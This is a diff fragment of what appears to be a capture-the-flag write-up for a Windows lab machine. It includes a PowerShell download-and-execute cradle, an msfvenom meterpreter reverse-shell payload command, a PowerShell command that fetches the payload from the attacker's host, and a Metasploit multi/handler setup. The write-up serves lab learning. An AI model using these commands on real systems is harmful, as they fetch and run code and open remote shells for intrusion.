@@ -36,3 +36,13 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://x.x.x.x:8000/Po
 
 Locally, I start a netcat listener and a web server to serve the powershell script.
 After a short moment, I receive a reverse shell and am able to retrieve user flag.
+
+======Privilege Escalation==============================
+Create a reverse shell payload using msfvenom as shown here :
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+Then upload the payload as : powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+
+What follows is to set up a multi handler on msfconsole:
+use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
+
+The rest of the steps are easy to follow as guided on the room
